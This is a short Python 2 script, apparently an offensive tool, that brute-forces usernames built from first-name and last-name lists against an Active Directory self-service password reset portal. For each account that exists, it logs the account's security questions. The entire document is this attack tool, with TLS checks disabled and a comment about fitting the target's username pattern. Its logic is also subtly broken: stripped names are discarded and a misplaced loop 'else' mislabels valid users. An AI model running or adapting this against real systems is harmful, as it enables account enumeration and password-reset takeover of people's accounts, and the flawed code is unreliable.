import requests
import re

good_re = re.compile(r'Time left for this operation')
ques_re = re.compile(r'<td align="left">(.*)\?</td>')


def check_user(username):
    s = requests.Session()
    s.verify = False
    s.get(server + '/accounts/Reset')

    data = {'userName': username,
            'DOMAIN_FLAT_NAME': domain}
    resp = s.post(server + '/accounts/PasswordSelfService', data=data)
    m = good_re.search(resp.content)

    if m is not None:
        m = ques_re.findall(resp.content)
        out.write("{0}:\n".format(username))
        for q in m:
            out.write("\t{0}?\n".format(q))
        else:
            print "{0} is invalid.".format(username)

server = 'https://server'
domain = 'DOMAIN'
out = open('ad_self_service_miner.log', 'w')

for f in open('firstnames.txt'):
    f.strip()
    for l in open('lastnames.txt'):
        l.strip()
        # Modify the user variable to match the username pattern of the target
        user = "{0}.{1}".format(f.capitalize(), l.capitalize())
        check_user(user)
        out.flush()

out.close()
